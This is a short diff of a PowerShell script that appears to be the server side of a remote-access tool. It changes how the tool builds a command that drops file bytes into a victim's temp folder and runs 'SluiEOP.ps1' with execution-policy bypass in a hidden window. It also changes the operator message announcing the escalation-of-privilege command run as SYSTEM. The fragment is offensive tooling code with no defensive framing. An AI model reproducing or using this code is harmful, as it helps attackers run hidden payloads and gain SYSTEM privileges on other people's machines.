@@ -939,7 +939,7 @@ While($Client.Connected)
               $FileBytes = "($FileBytes)";
               $File = $File.Split('\')[-1];
               $File = $File.Split('/')[-1];
-              $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};powershell -exec bypass -w 1 -File `"$env:TMP\SluiEOP.ps1`" `"$mYcOMMAND`""
+              $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};powershell.exe -exec bypass -w 1 -File `"`$env:TMP\SluiEOP.ps1`" `"$mYcOMMAND`""
               $Command = $Command -replace "#","$File";
               $Command = $Command -replace "@","$FileBytes";
               $Upload = $True;
@@ -2031,7 +2031,9 @@ While($Client.Connected)
           } 
           If($SluiEOP -eq "True")
           {
-            write-host "   Exec:    '$mYcOMMAND' (SYSTEM)" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
+            Write-Host "`n   Executing EOP Command" -ForeGroundColor green;
+            Write-Host "   ---------------------"
+            Write-Host "   $mYcOMMAND" -ForeGroundColor yellow;Start-Sleep -Seconds 1
             $SluiEOP = "False";
           }
           If($Flipflop -eq "True")
